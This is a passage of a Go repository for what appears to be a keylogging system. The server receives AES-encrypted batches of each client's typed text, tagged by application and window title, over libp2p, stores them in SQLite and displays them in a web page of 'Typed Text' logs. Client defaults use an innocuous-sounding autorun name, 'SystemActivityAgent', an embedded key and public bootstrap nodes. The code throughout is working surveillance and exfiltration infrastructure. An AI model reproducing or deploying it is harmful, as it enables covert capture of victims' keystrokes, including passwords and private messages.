			logger.Printf("Server P2P: Failed to send error (decryption) response to %s: %v", remotePeer, wErr)
		}
		return
	}

	var logEvents []types.LogEvent
	if err := json.Unmarshal(decryptedJSON, &logEvents); err != nil {
		logger.Printf("Server P2P: Failed to unmarshal LogEvents JSON from %s (ClientAppID: %s): %v", remotePeer, request.AppClientID, err)
		resp := p2p.LogBatchResponse{Status: "error", Message: "JSON unmarshal failed on server.", ServerTimestamp: time.Now().Unix()}
		if wErr := p2p.WriteMessage(stream, &resp); wErr != nil {
			logger.Printf("Server P2P: Failed to send error (unmarshal) response to %s: %v", remotePeer, wErr)
		}
		return
	}
	logger.Printf("Server P2P: Unmarshaled %d log events from ClientAppID: %s", len(logEvents), request.AppClientID)

	processedCount, err := store.AddReceivedLogEvents(logEvents, time.Now().UTC())
	if err != nil {
		logger.Printf("Server P2P: Failed to store log events from %s (ClientAppID: %s): %v", remotePeer, request.AppClientID, err)
		resp := p2p.LogBatchResponse{Status: "error", Message: fmt.Sprintf("Server DB error: %s", err.Error()), EventsProcessed: processedCount, ServerTimestamp: time.Now().Unix()}
		if wErr := p2p.WriteMessage(stream, &resp); wErr != nil {
			logger.Printf("Server P2P: Failed to send error (DB) response to %s: %v", remotePeer, wErr)
		}
		return
	}

	successResp := p2p.LogBatchResponse{
		Status:          "success",
		Message:         fmt.Sprintf("Successfully processed %d log events.", processedCount),
		EventsProcessed: processedCount,
		ServerTimestamp: time.Now().Unix(),
	}
	if err := p2p.WriteMessage(stream, &successResp); err != nil {
		logger.Printf("Server P2P: Failed to send success response to %s: %v", remotePeer, err)
	} else {
		logger.Printf("Server P2P: Sent success response to %s for %d events (ClientAppID: %s).", remotePeer, processedCount, request.AppClientID)
	}
}

func (pm *ServerP2PManager) Close() error {
	if pm.kademliaDHT != nil {
		if err := pm.kademliaDHT.Close(); err != nil {
			pm.logger.Printf("Server P2P: Error closing Kademlia DHT: %v", err)
		}
	}
	if pm.host != nil {
		pm.logger.Println("Server P2P: Closing libp2p host...")
		return pm.host.Close()
	}
	return nil
}

func runServerP2PManager(
	p2pManager *ServerP2PManager,
	internalQuit <-chan struct{},
	wg *sync.WaitGroup,
	logger *log.Logger,
) {
	defer wg.Done()
	p2pManager.logger.Println("Server P2P Manager goroutine starting.")

	p2pCtx, cancelP2pCtx := context.WithCancel(context.Background())
	defer cancelP2pCtx()

	p2pManager.StartBootstrapAndDiscovery(p2pCtx)

	<-internalQuit
	p2pManager.logger.Println("Server P2P Manager goroutine stopping...")
}

'''
'''--- generator/templates/server_template/static/style.css ---
body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    line-height: 1.6;
    margin: 0;
    padding: 20px;
    background-color: #f4f7f6;
    color: #333;
}
.container {
    max-width: 900px;
    margin: auto;
    background: #fff;
    padding: 25px;
    border-radius: 8px;
    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
}
h1 {
    color: #2c3e50;
    text-align: center;
    margin-bottom: 20px;
}
code {
    background-color: #e8e8e8;
    padding: 2px 5px;
    border-radius: 4px;
    font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace;
}
.log-entry-list {
    margin-top: 20px;
}
.log-entry {
    border: 1px solid #e0e0e0;
    border-radius: 5px;
    padding: 15px;
    margin-bottom: 20px;
    background-color: #fdfdfd;
}
.log-entry h3 {
    margin-top: 0;
    color: #3498db;
    font-size: 1.2em;
}
.log-entry .app-title {
    font-weight: normal;
    font-size: 0.9em;
    color: #555;
}
.log-entry .metadata {
    font-size: 0.85em;
    color: #7f8c8d;
    margin-bottom: 10px;
    border-bottom: 1px dashed #eee;
    padding-bottom: 8px;
}
.log-entry .metadata strong {
    color: #666;
}
.typed-text h4 {
    margin-top: 10px;
    margin-bottom: 5px;
    font-size: 0.9em;
    color: #333;
}
.typed-text pre {
    background-color: #f9f9f9;
    padding: 10px;
    border: 1px solid #eee;
    border-radius: 4px;
    white-space: pre-wrap; /* Allow text to wrap */
    word-wrap: break-word; /* Break long words */
    font-size: 0.9em;
    max-height: 200px; /* Limit height and make scrollable */
    overflow-y: auto;
}
.pagination {
    margin-top: 30px;
    text-align: center;
}
.pagination a, .pagination span {
    display: inline-block;
    padding: 8px 12px;
    margin: 0 4px;
    border: 1px solid #ddd;
    border-radius: 4px;
    text-decoration: none;
    color: #3498db;
}
.pagination a:hover {
    background-color: #f0f0f0;
}
.pagination span.disabled {
    color: #aaa;
    border-color: #eee;
}
.error-message {
    color: #c0392b;
    background-color: #fbeaea;
    border: 1px solid #e8c3c3;
    padding: 10px;
    border-radius: 4px;
}
'''
'''--- generator/templates/server_template/web_templates/error_page.html ---
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Error - {{.ErrorTitle}}</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <div class="container">
        <h1>Error: {{.ErrorTitle}}</h1>
        <p class="error-message">{{.ErrorMessage}}</p>
        <p><a href="/logs">Return to Logs</a></p>
    </div>
</body>
</html>
'''
'''--- generator/templates/server_template/web_templates/logs_view.html ---
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Activity Logs - Page {{.CurrentPage}}</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <div class="container">
        <h1>Activity Logs</h1>
        <p>Server PeerID: <code>{{.ServerPeerID}}</code></p>
        <p>Displaying page {{.CurrentPage}} of {{.TotalPages}}. Total Events: {{.TotalEvents}}.</p>

        {{if not .Events}}
            <p>No log events found.</p>
        {{else}}
            <div class="log-entry-list">
                {{range .Events}}
                    <div class="log-entry">
                        <h3>{{.ApplicationName}} <span class="app-title">- "{{.InitialWindowTitle}}"</span></h3>
                        <p class="metadata">
                            <strong>Event ID:</strong> {{.ID}} | 
                            <strong>Client ID:</strong> {{.ClientID_Short}} |
                            <strong>Session Start:</strong> {{.SessionStartStr}} | 
                            <strong>Session End:</strong> {{.SessionEndStr}} |
                            <strong>Log Timestamp:</strong> {{.LogTimestampStr}} |
                            <strong>Schema:</strong> v{{.SchemaVersion}}
                        </p>
                        {{with .EventData.ApplicationActivity}}
                            <div class="typed-text">
                                <h4>Typed Text:</h4>
                                <pre>{{if .TypedText}}{{.TypedText}}{{else}}[No text typed]{{end}}</pre>
                            </div>
                        {{else}}
                            <p><em>Non-ApplicationActivity event or no data.</em></p>
                        {{end}}
                    </div>
                {{end}}
            </div>

            <div class="pagination">
                {{if gt .CurrentPage 1}}
                    <a href="/logs?page={{.PrevPage}}&page_size={{.PageSize}}">« Previous</a>
                {{else}}
                    <span class="disabled">« Previous</span>
                {{end}}

                <span>
                    Page {{.CurrentPage}} of {{.TotalPages}}
                </span>

                {{if lt .CurrentPage .TotalPages}}
                    <a href="/logs?page={{.NextPage}}&page_size={{.PageSize}}">Next »</a>
                {{else}}
                    <span class="disabled">Next »</span>
                {{end}}
            </div>
        {{end}}
    </div>
</body>
</html>
'''
'''--- generator/templates/server_template/web_ui_handlers.go ---
// GuiKeyStandaloneGo/generator/templates/server_template/web_ui_handlers.go
package main

import (
	"fmt"
	"html/template" // Use html/template
	"log"
	"net/http"
	"path/filepath"
	"strconv"
	"time"

	"guikeystandalonego/pkg/types"
)

var (
	templates *template.Template // Global template cache
)

// LoadTemplates parses all HTML templates from the specified directory.
func LoadTemplates(templateDir string, logger *log.Logger) error {
	if templates == nil {
		templates = template.New("") // Create a new template collection
	}

	// Add custom functions if needed here, for example, a function to check if a field exists
	// funcMap := template.FuncMap{
	// 	"hasTypedText": func(ed types.EventData) bool {
	// 		return ed.ApplicationActivity != nil && ed.ApplicationActivity.TypedText != ""
	// 	},
	// }
	// templates = templates.Funcs(funcMap)

	globPath := filepath.Join(templateDir, "*.html")
	if logger != nil { // Check logger before using
		logger.Printf("WebUI: Loading templates from glob: %s", globPath)
	}

	var err error
	// ParseGlob can be called multiple times on the same template collection to add more templates
	templates, err = templates.ParseGlob(globPath)
	if err != nil {
		return fmt.Errorf("webui: failed to parse templates from %s: %w", globPath, err)
	}
	if logger != nil {
		logger.Printf("WebUI: Templates loaded successfully.")
	}
	return nil
}

// Data structures for templates
type LogsViewData struct {
	Events       []DisplayLogEvent
	CurrentPage  uint
	TotalPages   uint
	PageSize     uint
	PrevPage     uint
	NextPage     uint
	TotalEvents  int64
	ServerPeerID string
}

type DisplayLogEvent struct {
	// Embed original LogEvent. Template will access fields like .ApplicationName, .EventData.ApplicationActivity.TypedText
	types.LogEvent
	ClientID_Short  string // Example of a transformed field for display
	SessionStartStr string
	SessionEndStr   string
	LogTimestampStr string
}

type ErrorPageData struct {
	ErrorTitle   string
	ErrorMessage string
}

// WebUIEnv holds dependencies for handlers
type WebUIEnv struct {
	LogStore     *ServerLogStore
	ServerPeerID string
	Logger       *log.Logger
}

func indexHandler(w http.ResponseWriter, r *http.Request) {
	http.Redirect(w, r, "/logs", http.StatusFound)
}

func (env *WebUIEnv) viewLogsHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	pageStr := r.URL.Query().Get("page")
	pageSizeStr := r.URL.Query().Get("page_size")

	page, _ := strconv.ParseUint(pageStr, 10, 32)
	if page == 0 {
		page = 1
	}

	pageSize, _ := strconv.ParseUint(pageSizeStr, 10, 32)
	if pageSize == 0 {
		pageSize = 25
	}
	if pageSize > 100 {
		pageSize = 100
	}

	events, totalEvents, err := env.LogStore.GetLogEventsPaginated(uint(page), uint(pageSize))
	if err != nil {
		env.Logger.Printf("WebUI Error: Failed to get logs from store: %v", err)
		renderErrorTemplate(w, "Database Error", "Could not retrieve logs from the database.", env.Logger)
		return
	}

	displayEvents := make([]DisplayLogEvent, len(events))
	for i, event := range events {
		// Ensure ApplicationActivity is not nil before trying to access its fields
		var sessionStart, sessionEnd string
		if event.EventData.ApplicationActivity != nil {
			sessionStart = event.EventData.ApplicationActivity.StartTime.In(time.Local).Format("15:04:05") // Just time for brevity
			sessionEnd = event.EventData.ApplicationActivity.EndTime.In(time.Local).Format("15:04:05")
		} else {
			sessionStart = "N/A"
			sessionEnd = "N/A"
		}

		displayEvents[i] = DisplayLogEvent{
			LogEvent:        event, // Embed the original event
			ClientID_Short:  event.ClientID.String()[:8] + "...",
			LogTimestampStr: event.Timestamp.In(time.Local).Format("2006-01-02 15:04:05 MST"),
			SessionStartStr: sessionStart,
			SessionEndStr:   sessionEnd,
		}
	}

	totalPages := uint(0)
	if totalEvents > 0 && pageSize > 0 {
		totalPages = uint((totalEvents + int64(pageSize) - 1) / int64(pageSize))
	}
	if totalPages == 0 {
		totalPages = 1
	}

	data := LogsViewData{
		Events:       displayEvents,
		CurrentPage:  uint(page),
		TotalPages:   totalPages,
		PageSize:     uint(pageSize),
		PrevPage:     uint(max(1, int(page-1))),               // Ensure PrevPage is at least 1
		NextPage:     uint(min(int(totalPages), int(page+1))), // Ensure NextPage doesn't exceed TotalPages
		TotalEvents:  totalEvents,
		ServerPeerID: env.ServerPeerID,
	}

	// Ensure templates is not nil (should have been loaded at startup)
	if templates == nil {
		env.Logger.Println("WebUI Error: Templates not loaded!")
		http.Error(w, "Internal Server Error: Templates not loaded", http.StatusInternalServerError)
		return
	}

	err = templates.ExecuteTemplate(w, "logs_view.html", data)
	if err != nil {
		env.Logger.Printf("WebUI Error: Failed to execute logs_view template: %v", err)
		// Don't try to render error_page.html if ExecuteTemplate itself fails badly, just send plain error
		http.Error(w, "Internal Server Error rendering page", http.StatusInternalServerError)
	}
}

func renderErrorTemplate(w http.ResponseWriter, title string, message string, logger *log.Logger) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.WriteHeader(http.StatusInternalServerError) // Or appropriate status code

	if templates == nil { // Fallback if templates aren't loaded
		logger.Printf("WebUI Error: Templates not loaded, cannot render error page. Fallback error: %s - %s", title, message)
		fmt.Fprintf(w, "<h1>Error: %s</h1><p>%s</p><p>Additionally, templates could not be loaded.</p>", title, message)
		return
	}
	data := ErrorPageData{ErrorTitle: title, ErrorMessage: message}
	err := templates.ExecuteTemplate(w, "error_page.html", data)
	if err != nil {
		logger.Printf("WebUI Error: Failed to execute error_page template (original error: %s - %s): %v", title, message, err)
		// Fallback simple text error if error_page.html itself fails
		fmt.Fprintf(w, "<h1>Error: %s</h1><p>%s</p><p>Additionally, the error page itself failed to render.</p>", title, message)
	}
}

func max(a, b int) int {
	if a > b {
		return a
	}
	return b
}
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

'''
'''--- pkg/config/models.go ---
// GuiKeyStandaloneGo/pkg/config/models.go
package config

// For client_settings.toml (used by generator to structure data for client's embedded config)
type ClientSettings struct {
	ServerPeerID                       string   `toml:"server_peer_id"`
	EncryptionKeyHex                   string   `toml:"encryption_key_hex"`
	BootstrapAddresses                 []string `toml:"bootstrap_addresses"`
	ClientID                           string   `toml:"client_id"`
	SyncIntervalSecs                   uint64   `toml:"sync_interval"`
	ProcessorPeriodicFlushIntervalSecs uint64   `toml:"processor_periodic_flush_interval_secs"`
	InternalLogLevel                   string   `toml:"internal_log_level"`
	LogFilePath                        string   `toml:"log_file_path"` // For client's SQLite DB
	AppNameForAutorun                  string   `toml:"app_name_for_autorun"`
	LocalLogCacheRetentionDays         uint32   `toml:"local_log_cache_retention_days"`
	RetryIntervalOnFailSecs            uint64   `toml:"retry_interval_on_fail"`
	MaxRetriesPerBatch                 uint32   `toml:"max_retries_per_batch"`
	MaxLogFileSizeMB                   *uint64  `toml:"max_log_file_size_mb"`
	MaxEventsPerSyncBatch              int      `toml:"max_events_per_sync_batch"`
	InternalLogFileDir                 string   `toml:"internal_log_file_dir"`  // For client's diagnostic logs
	InternalLogFileName                string   `toml:"internal_log_file_name"` // For client's diagnostic logs
}

func DefaultClientSettings() ClientSettings {
	defaultSizeMB := uint64(56)
	return ClientSettings{
		ServerPeerID:     "",
		EncryptionKeyHex: "",
		BootstrapAddresses: []string{
			"/dnsaddr/bootstrap.libp2p.io/p2p/QmNnooDu7bfjPFoTZYxMNLWUQJyrVwtbZg5gBMjTezGAJN",
			"/dnsaddr/bootstrap.libp2p.io/p2p/QmbLHAnMoJPWSCR5Zhtx6BHJX9KiKNN6tpvbUcqanj75Nb",
			"/dnsaddr/bootstrap.libp2p.io/p2p/QmcZf59bWwK5XFi76CZX8cbJ4BhTzzA3gU1ZjYZcYW3dwt",
		},
		ClientID:                           "",
		SyncIntervalSecs:                   60,
		ProcessorPeriodicFlushIntervalSecs: 120,
		InternalLogLevel:                   "info",
		LogFilePath:                        "activity_cache.sqlite",
		AppNameForAutorun:                  "SystemActivityAgent",
		LocalLogCacheRetentionDays:         7,
		RetryIntervalOnFailSecs:            60,
		MaxRetriesPerBatch:                 3,
		MaxLogFileSizeMB:                   &defaultSizeMB,
		MaxEventsPerSyncBatch:              200,
		InternalLogFileDir:                 "client_logs",
		InternalLogFileName:                "monitor_client_diag.log",
	}
}

// For local_server_config.toml (used by generator to structure data for server's embedded config)
type ServerSettings struct {
	ListenAddress               string   `toml:"listen_address"`
	WebUIListenAddress          string   `toml:"web_ui_listen_address"`
	EncryptionKeyHex            string   `toml:"encryption_key_hex"`
	ServerIdentityKeySeedHex    string   `toml:"server_identity_key_seed_hex"`
	DatabasePath                string   `toml:"database_path"`
	LogRetentionDays            uint32   `toml:"log_retention_days"`
	LogDeletionCheckIntervalHrs uint64   `toml:"log_deletion_check_interval_hours"`
	BootstrapAddresses          []string `toml:"bootstrap_addresses,omitempty"`
	InternalLogLevel            string   `toml:"internal_log_level,omitempty"`     // <<< THIS FIELD MUST BE HERE
	InternalLogFileDir          string   `toml:"internal_log_file_dir,omitempty"`  // <<< THIS FIELD MUST BE HERE
	InternalLogFileName         string   `toml:"internal_log_file_name,omitempty"` // <<< THIS FIELD MUST BE HERE
}

func DefaultServerSettings() ServerSettings {
	return ServerSettings{
		ListenAddress:               "/ip4/0.0.0.0/tcp/0",
		WebUIListenAddress:          "0.0.0.0:8090",
		EncryptionKeyHex:            "",
		ServerIdentityKeySeedHex:    "",
		DatabasePath:                "activity_server.sqlite",
		LogRetentionDays:            30,
		LogDeletionCheckIntervalHrs: 24,
		BootstrapAddresses:          []string{},
		InternalLogLevel:            "info",                  // <<< AND INITIALIZED HERE
		InternalLogFileDir:          "server_logs",           // <<< AND INITIALIZED HERE
		InternalLogFileName:         "local_server_diag.log", // <<< AND INITIALIZED HERE
	}
}

'''
'''--- pkg/crypto/aes.go ---
// GuiKeyStandaloneGo/pkg/crypto/aes.go
package crypto

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
)

const AESKeySize = 32 // AES-256

func GenerateAESKeyBytes() ([]byte, error) { // Renamed to avoid conflict if GenerateAESKey() is later used for hex string
	key := make([]byte, AESKeySize)
	if _, err := rand.Read(key); err != nil {
		return nil, fmt.Errorf("failed to generate AES key: %w", err)
	}
	return key, nil
}

func Encrypt(data []byte, keyHex string) ([]byte, error) {
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		return nil, fmt.Errorf("invalid hex key for encryption: %w", err)
	}
	if len(key) != AESKeySize {
		return nil, fmt.Errorf("encryption key must be %d bytes", AESKeySize)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %w", err)
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, fmt.Errorf("failed to generate nonce: %w", err)
	}

	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}

func Decrypt(data []byte, keyHex string) ([]byte, error) {
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		return nil, fmt.Errorf("invalid hex key for decryption: %w", err)
	}
	if len(key) != AESKeySize {
		return nil, fmt.Errorf("decryption key must be %d bytes", AESKeySize)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher for decrypt: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM for decrypt: %w", err)
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt: %w", err)
	}
	return plaintext, nil
}

'''
'''--- pkg/crypto/keys.go ---
// GuiKeyStandaloneGo/pkg/crypto/keys.go
package crypto

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"fmt"

	// "io" // Not needed if using bytes.NewReader

	"github.com/google/uuid"
	// Use the specific libp2p crypto types for return values
	corecrypto "github.com/libp2p/go-libp2p/core/crypto"
)

func GenerateAppClientID() string {
	return uuid.NewString()
}

func GenerateLibp2pIdentitySeedHex() (string, error) {
	seed := make([]byte, 32)
	if _, err := rand.Read(seed); err != nil {
		return "", fmt.Errorf("failed to generate libp2p identity seed: %w", err)
	}
	return hex.EncodeToString(seed), nil
}

// Libp2pKeyFromSeedHex now returns libp2p's core crypto types.
func Libp2pKeyFromSeedHex(seedHex string) (corecrypto.PrivKey, corecrypto.PubKey, error) {
	seed, err := hex.DecodeString(seedHex)
	if err != nil {
		return nil, nil, fmt.Errorf("invalid hex seed for libp2p key: %w", err)
	}
	if len(seed) != 32 {
		return nil, nil, fmt.Errorf("libp2p seed must be 32 bytes for Ed25519, got %d", len(seed))
	}

	// GenerateEd25519Key returns the libp2p core crypto types
	priv, pub, err := corecrypto.GenerateEd25519Key(bytes.NewReader(seed))
	if err != nil {
		return nil, nil, fmt.Errorf("failed to generate Ed25519 key from seed: %w", err)
	}
	return priv, pub, nil
}

'''
'''--- pkg/p2p/protocol.go ---
// GuiKeyStandaloneGo/pkg/p2p/protocol.go
package p2p

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"

	// Our shared LogEvent type

	"github.com/libp2p/go-libp2p/core/network"
	"github.com/libp2p/go-libp2p/core/protocol"
)

// ProtocolID is the unique string that identifies our log sync protocol on libp2p.
const ProtocolID protocol.ID = "/guikey_standalone/logsync/1.0.0"

// MaxMessageSize prevents OOM from malicious or malformed messages.
const MaxMessageSize = 10 * 1024 * 1024 // 10 MB

// LogBatchRequest is what the client sends to the server.
type LogBatchRequest struct {
	AppClientID         string `json:"app_client_id"`         // The application-level UUID string of the client
	EncryptedLogPayload []byte `json:"encrypted_log_payload"` // JSON marshaled []types.LogEvent, then AES encrypted
}

// LogBatchResponse is what the server sends back to the client.
type LogBatchResponse struct {
	Status          string `json:"status"`           // e.g., "success", "error", "partial_success"
	Message         string `json:"message"`          // Detailed message, especially on error
	EventsProcessed int    `json:"events_processed"` // Number of LogEvent items server claims to have processed from this batch
	ServerTimestamp int64  `json:"server_timestamp"` // Unix timestamp of the server when responding
}

// --- Helper functions for reading/writing messages on a libp2p stream ---

// WriteMessage marshals the given data to JSON, prefixes with length, and writes to the stream.
func WriteMessage(stream network.Stream, data interface{}) error {
	jsonData, err := json.Marshal(data)
	if err != nil {
		return fmt.Errorf("p2p.WriteMessage: failed to marshal data to JSON: %w", err)
	}

	if len(jsonData) > MaxMessageSize {
		return fmt.Errorf("p2p.WriteMessage: message size %d exceeds MaxMessageSize %d", len(jsonData), MaxMessageSize)
	}

	// Use a buffered writer for efficiency
	writer := bufio.NewWriter(stream)

	// Write length prefix (e.g., 4-byte uint32 big endian) - simple newline for now for easier debugging
	// For production, a binary length prefix is better.
	// For now, let's use newline delimited JSON for easier debugging of the stream.
	// Later we can switch to a binary length prefix.
	_, err = writer.Write(jsonData)
	if err != nil {
		return fmt.Errorf("p2p.WriteMessage: failed to write JSON data: %w", err)
	}
	_, err = writer.WriteString("\n") // Newline delimiter
	if err != nil {
		return fmt.Errorf("p2p.WriteMessage: failed to write newline delimiter: %w", err)
	}

	return writer.Flush()
}

// ReadMessage reads a newline-delimited JSON message from the stream and unmarshals it.
func ReadMessage(stream network.Stream, target interface{}) error {
	// Use a buffered reader
	reader := bufio.NewReader(stream)

	// Read up to newline
	// For production, use a binary length prefix and io.ReadFull or LimitedReader.
	// For now, simple ReadBytes for newline delimited JSON. This is vulnerable to very long lines.
	// We should add a LimitedReader here for safety even with newline.

	// Create a limited reader to prevent reading excessively large lines
	// This is still not as robust as a binary length prefix but better than unlimited ReadBytes.
	lr := io.LimitedReader{R: reader, N: MaxMessageSize + 1} // +1 to detect if it exceeded

	jsonData, err := bufio.NewReader(&lr).ReadBytes('\n')
	if err != nil {
		if err == io.EOF && len(jsonData) > 0 { // EOF but got some data, try to process
			// This can happen if the stream closes without a final newline
		} else if err == io.EOF { // Clean EOF
			return io.EOF // Propagate clean EOF
		}
		return fmt.Errorf("p2p.ReadMessage: failed to read data from stream: %w", err)
	}

	if lr.N == 0 { // We read exactly up to MaxMessageSize + 1, meaning it was too large
		return fmt.Errorf("p2p.ReadMessage: message size exceeded MaxMessageSize %d", MaxMessageSize)
	}

	// Trim the newline before unmarshaling
	jsonData = jsonData[:len(jsonData)-1]

	if err := json.Unmarshal(jsonData, target); err != nil {
		// Log the problematic JSON for debugging (first 200 chars)
		preview := string(jsonData)
		if len(preview) > 200 {
			preview = preview[:200] + "..."
		}
		return fmt.Errorf("p2p.ReadMessage: failed to unmarshal JSON (preview: '%s'): %w", preview, err)
	}
	return nil
}

// --- Specific message handlers for client & server (optional, could be in their respective p2p_manager files) ---

// Client side: Send a batch and wait for response
func SendLogBatchAndGetResponse(stream network.Stream, clientID string, encryptedPayload []byte) (*LogBatchResponse, error) {
	req := LogBatchRequest{
		AppClientID:         clientID,
		EncryptedLogPayload: encryptedPayload,
	}
	// stream.SetWriteDeadline(time.Now().Add(10 * time.Second)) // Example deadline
	if err := WriteMessage(stream, &req); err != nil {
		return nil, fmt.Errorf("failed to send log batch request: %w", err)
	}

	var resp LogBatchResponse
	// stream.SetReadDeadline(time.Now().Add(30 * time.Second)) // Example deadline
	if err := ReadMessage(stream, &resp); err != nil {
		return nil, fmt.Errorf("failed to read log batch response: %w", err)
	}
	return &resp, nil
}

// Server side: Handle an incoming request (called by stream handler)
// This function would be called by the server's stream handler.
// It takes the stream, decrypts, processes, and then uses WriteMessage to send response.
// For now, this is just a conceptual placeholder of how the server might use ReadMessage.
func HandleIncomingLogBatchRequest(stream network.Stream,

/*
decryptFunc func(data []byte, keyHex string) ([]byte, error),
processFunc func(clientID string, events []types.LogEvent) (int, error),
encryptionKeyHex string,
*/
) (*LogBatchRequest, error) { // Simplified: just reads and returns request for now
	var req LogBatchRequest
	if err := ReadMessage(stream, &req); err != nil {
		return nil, err
	}
	return &req, nil
}

'''
'''--- pkg/types/events.go ---
// GuiKeyStandaloneGo/pkg/types/events.go
package types

import (
	"time"

	"github.com/google/uuid"
)

const CurrentSchemaVersion = 2

type LogEvent struct {
	ID                 uuid.UUID `json:"id"`
	ClientID           uuid.UUID `json:"client_id"`
	Timestamp          time.Time `json:"timestamp"` // Start time of ApplicationActivity
	ApplicationName    string    `json:"application_name"`
	InitialWindowTitle string    `json:"initial_window_title"`
	EventData          EventData `json:"event_data"`
	SchemaVersion      uint32    `json:"schema_version"`
}

type EventData struct {
	Type                string               `json:"type"` // "ApplicationActivity"
	ApplicationActivity *ApplicationActivity `json:"data,omitempty"`
	// Add other event types here if needed in the future
}

type ApplicationActivity struct {
	StartTime time.Time `json:"start_time"`
	EndTime   time.Time `json:"end_time"`
	TypedText string    `json:"typed_text"`
	// ClipboardActions []ClipboardActivity `json:"clipboard_actions"` // Removed as per request
}

// Helper to create a new ApplicationActivity LogEvent
func NewApplicationActivityEvent(
	clientID uuid.UUID,
	appName string,
	initialTitle string,
	startTime time.Time,
	endTime time.Time,
	typedText string,
) LogEvent {
	return LogEvent{
		ID:                 uuid.New(),
		ClientID:           clientID,
		Timestamp:          startTime, // Main event timestamp is session start
		ApplicationName:    appName,
		InitialWindowTitle: initialTitle,
		EventData: EventData{
			Type: "ApplicationActivity",
			ApplicationActivity: &ApplicationActivity{
				StartTime: startTime,
				EndTime:   endTime,
				TypedText: typedText,
			},
		},
		SchemaVersion: CurrentSchemaVersion,
	}
}

'''